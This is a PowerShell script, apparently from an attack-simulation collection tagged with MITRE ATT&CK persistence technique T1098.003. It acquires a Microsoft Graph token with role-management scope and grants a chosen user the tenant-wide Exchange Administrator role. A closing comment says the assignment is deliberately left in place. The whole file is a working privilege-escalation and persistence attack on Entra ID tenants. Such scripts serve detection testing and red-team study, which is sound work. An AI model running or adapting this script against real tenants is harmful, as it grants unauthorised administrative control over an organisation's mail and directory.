<#
.SYNOPSIS
Connect to Graph API, search for a user and give this user Exchange Administrator permissions

.DESCRIPTION
TA0003: Persistence
T1098.003: Additional Cloud Roles
1st attack method
#>

Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq custom | Remove-Module
Import-Module ../APIs/custom.psm1

# We use the ews environment variables
Import-Environment "graph.env"

Get-Module | Where-Object name -eq oauth-microsoft | Remove-Module
Import-Module ../APIs/oauth-microsoft.psm1
$scope = "User.ReadBasic.All RoleManagement.ReadWrite.Directory"
if ($null -eq $accessToken) { $accessToken = Get-DelegatedAccessToken -tenantId $env:TENANT_ID -clientId $env:GRAPH_DELEGATE_CLIENT_ID -scope $scope -redirectUrl $env:GRAPH_DELEGATE_REDIRECT_URI }

# Who do we want to give administrative permissions
$account = Read-Host -Prompt "UPN (grant access to)"
# The permissions to grant (https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference)
$permission = "29232cdf-9323-42fd-ade2-1d097af3e4de"

# Obtain the ID of the user to whom we assign a role
$url = "https://graph.microsoft.com/v1.0/users/$account"
$response = Invoke-RestMethod $url -Headers @{"Authorization"="Bearer $accessToken"}
$principalID = $response.id

# Add the permission
$url = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments"
$newRoleAssignment = @{
    "@odata.type" = "#microsoft.graph.unifiedRoleAssignment";
    "roleDefinitionId" = $permission;
    "principalId" = $principalID;
    "directoryScopeId" = "/";
} | ConvertTo-Json
$response = Invoke-RestMethod $url -Method Post -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"} -Body $newRoleAssignment

# We cannot delete the role assignment, because propagation takes a long time